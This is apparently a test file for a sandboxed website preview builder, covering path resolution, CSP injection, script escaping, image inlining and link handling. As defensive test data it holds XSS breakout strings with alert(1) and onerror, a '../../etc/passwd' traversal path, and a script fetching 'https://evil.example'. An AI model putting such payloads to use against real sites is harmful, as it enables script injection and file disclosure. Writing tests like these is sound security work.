import { describe, expect, it } from "vitest";
import { buildStaticSrcdoc, overlayChanges, pictureSrcdoc, resolveSitePath, sitePages } from "./static-preview";

const SITE = {
  "index.html": `<!doctype html><html><head><title>Bakery</title><link rel="stylesheet" href="styles.css"></head><body><h1>Sunrise</h1><a href="menu.html">Menu</a><script src="./script.js"></script></body></html>`,
  "menu.html": `<html><body><a href="index.html">Home</a></body></html>`,
  "styles.css": "h1 { color: tomato; } /* </style><script>alert(1)</script> */",
  "script.js": "document.title = 'x'; // </script><img src=x onerror=alert(1)>",
};

describe("resolveSitePath", () => {
  it("resolves links within the project and refuses the ones that leave it", () => {
    expect(resolveSitePath("index.html", "styles.css")).toBe("styles.css");
    expect(resolveSitePath("pages/about.html", "../css/site.css")).toBe("css/site.css");
    expect(resolveSitePath("pages/about.html", "/index.html")).toBe("index.html");
    expect(resolveSitePath("index.html", "menu.html?x=1#top")).toBe("menu.html");
    expect(resolveSitePath("index.html", "./")).toBe("index.html");
    expect(resolveSitePath("index.html", "https://example.com/a.css")).toBeNull();
    expect(resolveSitePath("index.html", "//cdn.example.com/a.js")).toBeNull();
    expect(resolveSitePath("index.html", "../../etc/passwd")).toBeNull();
    expect(resolveSitePath("index.html", "mailto:hi@example.com")).toBeNull();
  });
});

describe("buildStaticSrcdoc", () => {
  it("folds linked styles and scripts in, adds the lockdown policy, and keeps the page", () => {
    const doc = buildStaticSrcdoc(SITE)!;
    expect(doc).toContain("<h1>Sunrise</h1>");
    expect(doc).toContain("<style>h1 { color: tomato; }");
    expect(doc).not.toContain('href="styles.css"');
    expect(doc).toContain("document.title = 'x';");
    expect(doc).not.toContain('src="./script.js"');
    expect(doc).toContain("Content-Security-Policy");
    expect(doc).toContain("connect-src 'none'");
    expect(doc).toContain("form-action 'none'");
    // Pinned libraries load only from the three CDNs the Studio standard names, plus Farbaek Scenes from Farbaek itself (ADR 0156).
    expect(doc).toContain("script-src 'unsafe-inline' https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com https://www.farbaek.com;");
    expect(doc).toContain("media-src data: https: https://www.farbaek.com;");
    expect(doc).toContain("connect-src 'none'");
  });

  it("can't be broken out of by closing tags inside a stylesheet or script", () => {
    const doc = buildStaticSrcdoc(SITE)!;
    expect(doc).toContain("<\\/style><script>alert(1)");
    expect(doc).toContain("<\\/script><img src=x");
    // The only closing style tag is the one the builder wrote.
    expect(doc.match(/<\/style>/g)).toHaveLength(1);
  });

  it("leaves outside resources alone and wraps a fragment in a document", () => {
    const doc = buildStaticSrcdoc({ "index.html": '<link rel="stylesheet" href="https://fonts.example.com/a.css"><p>Hi</p>' })!;
    expect(doc).toContain('href="https://fonts.example.com/a.css"');
    expect(doc.startsWith("<!doctype html><meta http-equiv")).toBe(true);
  });

  it("puts the policy before anything the page says, so a commented-out <head> or an early script can't get ahead of it", () => {
    const sneaky = buildStaticSrcdoc({ "index.html": "<!--<head>--><script>fetch('https://evil.example')</script><!doctype html><html><head></head><body></body></html>" })!;
    expect(sneaky.indexOf("Content-Security-Policy")).toBeLessThan(sneaky.indexOf("<!--<head>-->"));
    const normal = buildStaticSrcdoc({ "index.html": "<!DOCTYPE html>\n<html lang=\"en\"><head><title>T</title></head><body><script>1</script></body></html>" })!;
    expect(normal.startsWith('<!DOCTYPE html><meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(normal.indexOf("Content-Security-Policy")).toBeLessThan(normal.indexOf("<script>1"));
  });

  it("is null for a page that doesn't exist", () => {
    expect(buildStaticSrcdoc(SITE, "about.html")).toBeNull();
  });
});

describe("sitePages and overlayChanges", () => {
  it("lists pages with index first, and lays a proposal's changes over the files", () => {
    expect(sitePages(SITE)).toEqual(["index.html", "menu.html"]);
    const after = overlayChanges(SITE, [
      { path: "styles.css", content: "h1 { color: navy; }" },
      { path: "about.html", content: "<p>About</p>" },
      { path: "menu.html", content: null },
    ]);
    expect(after["styles.css"]).toBe("h1 { color: navy; }");
    expect(sitePages(after)).toEqual(["index.html", "about.html"]);
    expect(SITE["styles.css"]).toContain("tomato");
  });
});

describe("pictureSrcdoc", () => {
  it("takes every script out of a picture and leaves the page", () => {
    const doc = buildStaticSrcdoc(SITE, "index.html")!;
    expect(doc).toMatch(/<script/i);
    const picture = pictureSrcdoc(doc + '<SCRIPT type="module">\nalert(1)\n</SCRIPT ><script src="a.js"/>');
    expect(picture).not.toMatch(/<script/i);
    expect(picture).toContain("<h1>Sunrise</h1>");
    expect(picture).toContain("tomato");
  });
});

describe("images in the preview (ADR 0108)", () => {
  const DOT = "data:image/png;base64,iVBORw0KGgo=";
  const images = { "assets/dot.png": DOT, "img/bg.webp": "data:image/webp;base64,UklGRg==" };

  it("swaps image paths for data URLs in src, srcset, href and inline styles", () => {
    const doc = buildStaticSrcdoc(
      {
        "index.html": `<html><head><link rel="icon" href="assets/dot.png"></head><body><img src="./assets/dot.png" srcset="assets/dot.png 1x, /img/bg.webp 2x" alt=""><div style="background:url('img/bg.webp')"></div><img src="https://example.com/a.png"><img src="missing.png"></body></html>`,
      },
      "index.html",
      images,
    )!;
    expect(doc).toContain(`<link rel="icon" href="${DOT}">`);
    expect(doc).toContain(`<img src="${DOT}" srcset="${DOT} 1x, data:image/webp;base64,UklGRg== 2x"`);
    expect(doc).toContain(`url('data:image/webp;base64,UklGRg==')`);
    // Outside addresses and images the project doesn't have stay as they are.
    expect(doc).toContain(`src="https://example.com/a.png"`);
    expect(doc).toContain(`src="missing.png"`);
  });

  it("resolves a stylesheet's url() from the stylesheet's own folder", () => {
    const doc = buildStaticSrcdoc({ "index.html": `<link rel="stylesheet" href="css/site.css"><p>hi</p>`, "css/site.css": "body{background:url(../img/bg.webp)}" }, "index.html", images)!;
    expect(doc).toContain("body{background:url(data:image/webp;base64,UklGRg==)}");
  });

  it("leaves a page without images exactly as before", () => {
    const files = { "index.html": `<img src="assets/dot.png">` };
    expect(buildStaticSrcdoc(files, "index.html", {})).toBe(buildStaticSrcdoc(files, "index.html"));
    expect(buildStaticSrcdoc(files, "index.html")).toContain(`src="assets/dot.png"`);
  });
});

describe("links inside the preview", () => {
  const script = /<script>(\(function\(\)\{document\.addEventListener\("click"[\s\S]*?)<\/script>/.exec(buildStaticSrcdoc({ "index.html": "<p>Hi</p>" })!)![1]!;

  // The preview's script, in a stand-in for the page. A link the script doesn't stop is what blanked the preview.
  function preview(ids: string[] = []) {
    const listeners: Record<string, (e: unknown) => void> = {};
    const scrolled: string[] = [];
    const sent: unknown[] = [];
    const target = (id: string) => ({ scrollIntoView: () => scrolled.push(id) });
    const document = {
      addEventListener: (type: string, fn: (e: unknown) => void) => (listeners[type] = fn),
      getElementById: (id: string) => (ids.includes(id) ? target(id) : null),
      getElementsByName: () => [],
    };
    new Function("document", "parent", "scrollTo", script)(document, { postMessage: (m: unknown) => sent.push(m) }, () => scrolled.push("top of the page"));
    const click = (href: string) => {
      const e = { prevented: false, preventDefault() { this.prevented = true; }, target: { closest: () => ({ getAttribute: () => href }) } };
      listeners.click!(e);
      return e.prevented;
    };
    return { click, scrolled, sent };
  }

  it("scrolls to a part of the page itself, and never leaves it to the browser", () => {
    const p = preview(["hours"]);
    expect(p.click("#hours")).toBe(true);
    expect(p.scrolled).toEqual(["hours"]);
    expect(p.sent).toEqual([]);
  });

  it("goes to the top for # and #top, reads an encoded name, and stays put when the name isn't there", () => {
    const p = preview(["opening hours"]);
    expect(p.click("#")).toBe(true);
    expect(p.click("#top")).toBe(true);
    expect(p.click("#opening%20hours")).toBe(true);
    expect(p.click("#%E0%A4%A")).toBe(true);
    expect(p.click("#nothing")).toBe(true);
    expect(p.scrolled).toEqual(["top of the page", "top of the page", "opening hours"]);
  });

  it("still switches pages through the app, and goes nowhere outside the site", () => {
    const p = preview();
    expect(p.click("menu.html")).toBe(true);
    expect(p.click("https://example.com/")).toBe(true);
    expect(p.sent).toHaveLength(1);
    expect(p.sent[0]).toMatchObject({ href: "menu.html" });
  });
});
